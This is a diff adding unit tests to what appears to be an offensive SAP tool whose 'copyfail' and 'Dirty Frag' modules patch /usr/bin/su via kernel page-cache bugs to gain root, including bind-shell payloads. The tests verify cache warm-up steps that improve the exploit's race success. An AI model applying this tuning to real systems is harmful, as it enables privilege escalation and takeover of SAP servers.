@@ -489,6 +489,99 @@ def test_copyfail_uses_unique_result_path_per_run():
         f"of the S4H bug; got: {result_paths!r}")
 
 
+def test_copyfail_exploit_script_warms_su_page_cache_before_patches():
+    """The exploit script must read /usr/bin/su into the page cache
+    IN-PROCESS before the _write4 patch loop, to counteract the
+    upload-induced eviction.
+
+    Operator-reported S4D regression: bind-shell payload (3103-byte
+    script, 104 chunks) lost the race 5/5 times even though the
+    smaller `id` test (2068-byte script, 69 chunks) won on attempt
+    1.  The extra chunks churn the kernel cache enough to evict
+    /usr/bin/su's pages by the time we fire the exploit.  Reading
+    the file back into cache IMMEDIATELY before the patch loop
+    minimises the eviction window between read + patch + execve."""
+    import sapmap_copyfail
+    # Inspect the actual template content - the warm-up must be in
+    # the source so it ends up in every generated script.
+    tmpl = sapmap_copyfail._EXPLOIT_TEMPLATE
+    assert "open('/usr/bin/su', 'rb')" in tmpl, (
+        f"Exploit template must open /usr/bin/su for read "
+        f"before patching; not found in template")
+    # Belt and braces: assert the warm-up appears BEFORE the
+    # _write4 patch loop in the script (order matters - the read
+    # must finish before patches start).
+    warmup_idx = tmpl.index("open('/usr/bin/su', 'rb')")
+    write4_loop_idx = tmpl.index("_write4(_i, _elf[_i:_i + 4])")
+    assert warmup_idx < write4_loop_idx, (
+        "warm-up read of /usr/bin/su must come BEFORE the "
+        "_write4 patch loop in the exploit template")
+
+
+def test_copyfail_warmup_uses_try_except_to_swallow_read_errors():
+    """The warm-up read is wrapped in try/except so a rare
+    read-permission failure (e.g. /usr/bin/su unreadable on a
+    weirdly-hardened image) doesn't crash the entire exploit
+    before the _write4 loop even gets a chance to run.  Patch
+    failures should surface from the actual exploit pathway, not
+    from the warm-up."""
+    import sapmap_copyfail
+    tmpl = sapmap_copyfail._EXPLOIT_TEMPLATE
+    # Look for try/except around the warmup
+    warmup_section = tmpl[tmpl.index("Re-warm"):tmpl.index("Load ELF")]
+    assert "try:" in warmup_section
+    assert "except Exception" in warmup_section or "except " in warmup_section
+
+
+def test_dirtyfrag_warms_su_page_cache_before_each_attempt():
+    """Dirty Frag mirror: read /usr/bin/su via SAPXPG `cat` right
+    before each binary attempt.  Less surgical than copyfail's
+    in-process warm-up (the SAPXPG round-trip leaves a ~200ms
+    eviction window) but better than no warm-up — especially for
+    the first attempt right after the upload churn."""
+    from sapmap_dirtyfrag import run_as_root
+
+    n = _node()
+    n.gw_vulnerable = True
+    n.dirtyfrag_kernel = "6.18.21"
+
+    gw_calls = []
+    def _fake_egc(node, prog, params="", long_params=""):
+        gw_calls.append((prog, params))
+        if prog in ("base64", "sudo") and ".df_result" in params:
+            return {"output": ["No such file"], "success": False}
+        return {"output": [], "success": True}
+
+    with patch("sapmap_dirtyfrag._load_blob", return_value={
+            "hex": "00" * 100, "size": 100, "sha256": "a" * 64}), \
+         patch("sapmap_exploit.execute_gw_command", side_effect=_fake_egc):
+        out = run_as_root(n, "id")
+
+    # Find each `cat /usr/bin/su` warm-up call and the `/tmp/.df_bin`
+    # binary execution call - the cat must IMMEDIATELY precede the
+    # binary, with no other SAPXPG calls between them, on every
+    # retry attempt.
+    cat_idxs = [i for i, (p, a) in enumerate(gw_calls)
+                  if p == "cat" and "/usr/bin/su" in a]
+    bin_idxs = [i for i, (p, a) in enumerate(gw_calls)
+                  if p == "/tmp/.df_bin"]
+    assert len(cat_idxs) >= 1, (
+        "Must call `cat /usr/bin/su` at least once to warm the "
+        "page cache before firing the binary")
+    assert len(bin_idxs) >= 1, "Binary must be invoked"
+    # Every binary invocation must be preceded by a cat warm-up.
+    for bin_i in bin_idxs:
+        # The cat call must be the IMMEDIATELY previous call
+        # (no other SAPXPG round-trip allowed to evict between
+        # them).
+        prev_call = gw_calls[bin_i - 1] if bin_i > 0 else None
+        assert prev_call is not None
+        assert prev_call[0] == "cat" and "/usr/bin/su" in prev_call[1], (
+            f"Binary call at idx {bin_i} not immediately preceded "
+            f"by `cat /usr/bin/su` warm-up; prev call was: "
+            f"{prev_call!r}")
+
+
 def test_copyfail_progress_cb_fires_during_upload_and_attempts():
     """copyfail.run_as_root accepts a ``progress_cb`` callback that
     fires during major steps so the GUI's bind-shell status row can
